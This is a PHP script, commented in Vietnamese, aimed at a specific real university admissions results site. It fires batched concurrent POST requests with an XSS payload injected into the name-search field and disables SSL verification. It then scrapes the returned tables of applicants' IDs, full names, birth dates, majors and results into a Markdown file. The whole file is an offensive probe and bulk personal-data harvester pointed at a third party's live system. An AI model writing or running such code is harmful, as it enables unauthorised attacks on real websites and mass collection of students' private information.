<?php

// Hàm để tạo yêu cầu cURL với mã độc XSS
function createCurlHandle($char, $page) {
    $url = "https://tuyensinh.ctim.edu.vn/ket-qua-xet-tuyen.html";

    // Dữ liệu POST với mã độc XSS
    $postData = [
        'ALTER_INTERFACE' => 'AdmissionGetListResult',
        'ORDER_BY' => 'FULL_NAME',
        'CURRENT_PAGE' => $page,
        'ITEMS_PER_PAGE' => '25',
        'DATE_SEND_MAIL' => '06/06/2024',
        'SEARCH_PERIOD' => '9',
        'SEARCH_STATUS' => '20',
        'SEARCH_NAME' => $char . "<script>alert('XSS');</script>"
    ];

    // Khởi tạo cURL
    $ch = curl_init();

    // Thiết lập các tùy chọn cho cURL
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postData));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Chỉ dùng nếu bạn gặp vấn đề với chứng chỉ SSL
    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/x-www-form-urlencoded; charset=UTF-8'));

    return $ch;
}

// Tạo hoặc mở file để ghi
$file = fopen("output.md", "w");

// Ghi tiêu đề bảng vào file
fwrite($file, "# Kết quả xét tuyển\n\n");
fwrite($file, "## Bảng kết quả xét tuyển\n\n");
fwrite($file, "| # | Mã hồ sơ | Họ và tên | Ngày sinh | Ngành xét tuyển | Hình thức xét tuyển | Kết quả |\n");
fwrite($file, "| --- | --- | --- | --- | --- | --- | --- |\n");

// Mảng để lưu trữ các handles cURL
$multiHandles = [];
$multiCurl = curl_multi_init();

// Vòng lặp từ 'a' đến 'z'
foreach (range('a', 'z') as $char) {
    echo "Đang khởi tạo yêu cầu cho ký tự: $char\n";
    $page = 1;
    $hasResults = true;
    while ($hasResults) {
        $ch = createCurlHandle($char, $page);
        curl_multi_add_handle($multiCurl, $ch);
        $multiHandles[] = [$char, $page, $ch];
        $page++;
        if ($page > 5) { // Giả sử mỗi ký tự không có quá 5 trang, bạn có thể điều chỉnh nếu cần
            $hasResults = false;
        }
    }
}

// Thực thi các yêu cầu cURL đồng thời
$running = null;
do {
    curl_multi_exec($multiCurl, $running);
    curl_multi_select($multiCurl);
} while ($running > 0);

// Xử lý kết quả các yêu cầu cURL
foreach ($multiHandles as $handle) {
    list($char, $page, $ch) = $handle;
    $output = curl_multi_getcontent($ch);

    // In ra kết quả HTML nhận được cho ký tự và trang hiện tại
    echo "Kết quả HTML cho ký tự $char, trang $page:\n";
    echo substr($output, 0, 1000) . "\n"; // In ra 1000 ký tự đầu tiên của HTML để debug

    // Sử dụng DOMDocument để xử lý kết quả HTML
    $dom = new DOMDocument;
    @$dom->loadHTML('<?xml encoding="UTF-8">' . $output);
    $xpath = new DOMXPath($dom);

    // Tìm các hàng trong bảng kết quả
    $rows = $xpath->query("//table[@class='table table-bordered']/tr");

    // Kiểm tra số lượng hàng tìm thấy
    echo "Số lượng hàng tìm thấy cho ký tự $char, trang $page: " . $rows->length . "\n";

    // Duyệt qua các hàng và lưu thông tin vào mảng
    foreach ($rows as $index => $row) {
        $cells = $row->getElementsByTagName('td');
        if ($cells->length > 0) {
            $result = [];
            foreach ($cells as $cell) {
                $result[] = trim($cell->textContent);
            }

            // In ra thông tin hàng hiện tại
            echo "Hàng $index cho ký tự $char, trang $page: " . implode(' | ', $result) . "\n";

            // Ghi kết quả vào file
            fwrite($file, "| " . implode(" | ", $result) . " |\n");
        }
    }

    // Đóng handle cURL
    curl_multi_remove_handle($multiCurl, $ch);
    curl_close($ch);
}

// Đóng multi cURL
curl_multi_close($multiCurl);

// Đóng file
fclose($file);

echo "Kết quả đã được lưu vào file output.md\n";
